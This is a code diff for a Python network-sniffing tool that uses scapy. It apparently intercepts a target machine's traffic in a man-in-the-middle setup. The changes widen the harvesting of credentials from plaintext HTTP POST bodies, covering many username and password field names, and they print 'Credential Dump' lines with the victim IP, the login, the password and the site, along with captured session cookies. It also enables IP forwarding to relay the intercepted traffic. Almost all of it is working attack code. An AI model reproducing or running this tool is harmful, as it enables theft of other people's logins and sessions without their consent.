@@ -12,7 +12,6 @@ import ctypes
 import subprocess
 import requests
 import re
-import urllib.parse
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -68,44 +67,58 @@ class Device:
         def http_pkt_callback(pkt):
             if pkt.haslayer('Raw'):
                 raw_data = pkt['Raw'].load.decode(errors='ignore')
-                if "POST" in raw_data or "GET" in raw_data:
-                    if "Host:" in raw_data and "GET" in raw_data:
-                        try:
-                            host = raw_data.split("Host: ")[1].split("\r\n")[0]
-                            path = raw_data.split("GET ")[1].split(" HTTP")[0]
-                            url = f"http://{host}{path}"
-                            print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
-                        except Exception:
-                            pass
+                login_fields = ['heslo', 'passwd', 'pwd', 'user_id', 'pseudonym', 'phone',
+                                'password', 'user', 'username', 'login', 'pass', 'uname']
+                creds_found = {}
+                url = "unknown"
+                show_dump = False
 
-                    # Enhanced credentials recognition (login forms, user_id, etc.)
-                    if "POST" in raw_data:
-                        credentials = {}
-                        for key in ['username', 'user', 'login', 'email']:
-                            if key in raw_data.lower():
-                                credentials['username'] = re.search(rf"{key}=[^&]+", raw_data).group(0).split('=')[1]
-                        for key in ['password', 'pass', 'pwd']:
-                            if key in raw_data.lower():
-                                credentials['password'] = re.search(rf"{key}=[^&]+", raw_data).group(0).split('=')[1]
-                        # Additional form fields (user_id, pseudonym, phone, etc.)
-                        for key in ['user_id', 'pseudonym', 'heslo', 'passwd', 'phone']:
-                            if key in raw_data.lower():
-                                credentials[key] = re.search(rf"{key}=[^&]+", raw_data).group(0).split('=')[1]
+                # Extract Host and Path for full URL
+                if "Host:" in raw_data and "GET" in raw_data:
+                    try:
+                        host = raw_data.split("Host: ")[1].split("\r\n")[0]
+                        path = raw_data.split("GET ")[1].split(" HTTP")[0]
+                        url = f"http://{host}{path}"
+                        print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
+                    except Exception:
+                        pass
 
-                        # If credentials are found, print them in green
-                        if 'username' in credentials and 'password' in credentials:
-                            print(f"\n{Fore.GREEN}Credential Dump:{Style.RESET_ALL}")
-                            print(f"{Fore.GREEN}IP: {self.targetip} > LOGIN: {credentials['username']} PWD: {credentials['password']} SITE: {url}{Style.RESET_ALL}")
-                            print(f"{Fore.GREEN}CONTENT: {raw_data.replace('\r\n', ' ')}{Style.RESET_ALL}")
+                elif "Host:" in raw_data and "POST" in raw_data:
+                    try:
+                        host = raw_data.split("Host: ")[1].split("\r\n")[0]
+                        path = raw_data.split("POST ")[1].split(" HTTP")[0]
+                        url = f"http://{host}{path}"
+                    except Exception:
+                        pass
 
-                    # Capture cookies
-                    if "Set-Cookie:" in raw_data:
-                        cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
-                        print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
+                if "POST" in raw_data:
+                    # Lowercase search for login keywords
+                    for field in login_fields:
+                        regex = re.compile(rf'{field}=([^&\s]+)', re.IGNORECASE)
+                        match = regex.search(raw_data)
+                        if match:
+                            creds_found[field.lower()] = match.group(1)
+                            show_dump = True
+
+                    if show_dump:
+                        login = "-"
+                        pwd = "-"
+                        for key in creds_found:
+                            if key in ['user', 'username', 'login', 'uname', 'user_id', 'pseudonym', 'phone']:
+                                login = creds_found[key]
+                            if key in ['password', 'pass', 'pwd', 'passwd', 'heslo']:
+                                pwd = creds_found[key]
+
+                        print(f"{Fore.GREEN}Credential Dump:{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}    IP: {self.targetip} > LOGIN: {login}  PWD: {pwd}  SITE: {url}{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}    CONTENT: {raw_data.strip().replace(chr(13), '').replace(chr(10), '')}{Style.RESET_ALL}")
+
+                if "Set-Cookie:" in raw_data:
+                    cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
+                    print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
 
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
-
 
     def enable_ip_forwarding(self):
         subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
